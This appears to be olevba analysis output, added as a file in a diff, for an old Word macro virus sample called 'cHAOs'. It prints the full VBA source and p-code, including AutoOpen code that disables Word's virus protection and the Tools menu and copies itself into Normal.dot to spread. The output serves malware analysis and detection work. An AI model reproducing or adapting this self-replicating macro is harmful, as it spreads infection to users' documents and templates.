@@ -1,0 +1,277 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Virus.MSWord.Poc
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: Virus.MSWord.Poc - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO cHAOs.bas 
+in file: Virus.MSWord.Poc - OLE stream: 'Macros/VBA/cHAOs'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+'cHAOs virus authored by aLPHABETs
+'aLPHABETs InC.
+
+Sub ViewVBCode()
+End Sub
+
+Sub AutoOpen()
+Application.EnableCancelKey = False
+Options.VirusProtection = False
+Set V1Stealth = CommandBars("Tools")
+V1Stealth.Enabled = False
+
+If UCase(ThisDocument.Name) = "NORMAL.DOT" Then
+  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
+        If ActiveDocument.VBProject.VBComponents(i).Name = "cHAOs" Then GoTo EndCleaner
+  Next i
+    VSource = NormalTemplate.FullName
+    VTarget = ActiveDocument.FullName
+Else
+  For i = 1 To NormalTemplate.VBProject.VBComponents.Count
+        If NormalTemplate.VBProject.VBComponents(i).Name = "cHAOs" Then GoTo EndCleaner
+  Next i
+    VSource = ActiveDocument.FullName
+    VTarget = NormalTemplate.FullName
+End If
+Application.OrganizerCopy VSource, VTarget, "cHAOs", wdOrganizerObjectProjectItems
+EndCleaner:
+End Sub
+
+Sub Save()
+Set myDocument = ActiveDocument
+With myDocument.Shapes.AddShape(msoSmileyFace, 90, 90, 90, 50).Fill
+    .ForeColor.RGB = RGB(128, 0, 0)
+    .BackColor.RGB = RGB(170, 0, 170)
+    .TwoColorGradient msoGradientHorizontal, 1
+End With
+End Sub
+
+Sub AutoClose()
+Dim Count As Integer
+    For Count = 1 To 10
+        Beep
+        Beep
+    Next
+MsgBox "Embrace The Power Of Chaos!!"
+End Sub
+
+
+
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: Virus.MSWord.Poc
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 1770 bytes
+' Macros/VBA/cHAOs - 5026 bytes
+' Line #0:
+' 	QuoteRem 0x0000 0x0021 "cHAOs virus authored by aLPHABETs"
+' Line #1:
+' 	QuoteRem 0x0000 0x000E "aLPHABETs InC."
+' Line #2:
+' Line #3:
+' 	FuncDefn (Sub ViewVBCode())
+' Line #4:
+' 	EndSub 
+' Line #5:
+' Line #6:
+' 	FuncDefn (Sub AutoOpen())
+' Line #7:
+' 	LitVarSpecial (False)
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #8:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #9:
+' 	SetStmt 
+' 	LitStr 0x0005 "Tools"
+' 	ArgsLd CommandBars 0x0001 
+' 	Set V1Stealth 
+' Line #10:
+' 	LitVarSpecial (False)
+' 	Ld V1Stealth 
+' 	MemSt Enabled 
+' Line #11:
+' Line #12:
+' 	Ld ThisDocument 
+' 	MemLd New 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x000A "NORMAL.DOT"
+' 	Eq 
+' 	IfBlock 
+' Line #13:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #14:
+' 	Ld i 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd New 
+' 	LitStr 0x0005 "cHAOs"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo EndCleaner 
+' 	EndIf 
+' Line #15:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #16:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	St VSource 
+' Line #17:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	St VTarget 
+' Line #18:
+' 	ElseBlock 
+' Line #19:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #20:
+' 	Ld i 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd New 
+' 	LitStr 0x0005 "cHAOs"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo EndCleaner 
+' 	EndIf 
+' Line #21:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #22:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	St VSource 
+' Line #23:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	St VTarget 
+' Line #24:
+' 	EndIfBlock 
+' Line #25:
+' 	Ld VSource 
+' 	Ld VTarget 
+' 	LitStr 0x0005 "cHAOs"
+' 	Ld wdOrganizerObjectProjectItems 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #26:
+' 	Label EndCleaner 
+' Line #27:
+' 	EndSub 
+' Line #28:
+' Line #29:
+' 	FuncDefn (Sub Save())
+' Line #30:
+' 	SetStmt 
+' 	Ld ActiveDocument 
+' 	Set myDocument 
+' Line #31:
+' 	StartWithExpr 
+' 	Ld msoSmileyFace 
+' 	LitDI2 0x005A 
+' 	LitDI2 0x005A 
+' 	LitDI2 0x005A 
+' 	LitDI2 0x0032 
+' 	Ld myDocument 
+' 	MemLd Shapes 
+' 	ArgsMemLd AddShape 0x0005 
+' 	MemLd Fill 
+' 	With 
+' Line #32:
+' 	LitDI2 0x0080 
+' 	LitDI2 0x0000 
+' 	LitDI2 0x0000 
+' 	ArgsLd RSet 0x0003 
+' 	MemLdWith ForeColor 
+' 	MemSt RSet 
+' Line #33:
+' 	LitDI2 0x00AA 
+' 	LitDI2 0x0000 
+' 	LitDI2 0x00AA 
+' 	ArgsLd RSet 0x0003 
+' 	MemLdWith BackColor 
+' 	MemSt RSet 
+' Line #34:
+' 	Ld msoGradientHorizontal 
+' 	LitDI2 0x0001 
+' 	ArgsMemCallWith TwoColorGradient 0x0002 
+' Line #35:
+' 	EndWith 
+' Line #36:
+' 	EndSub 
+' Line #37:
+' Line #38:
+' 	FuncDefn (Sub AutoClose())
+' Line #39:
+' 	Dim 
+' 	VarDefn Count (As Integer)
+' Line #40:
+' 	StartForVariable 
+' 	Ld Count 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x000A 
+' 	For 
+' Line #41:
+' 	ArgsCall Beep 0x0000 
+' Line #42:
+' 	ArgsCall Beep 0x0000 
+' Line #43:
+' 	StartForVariable 
+' 	Next 
+' Line #44:
+' 	LitStr 0x001C "Embrace The Power Of Chaos!!"
+' 	ArgsCall MsgBox 0x0001 
+' Line #45:
+' 	EndSub 
+' Line #46:
+' Line #47:
+' Line #48:
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|AutoExec  |AutoClose           |Runs when the Word document is closed        |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
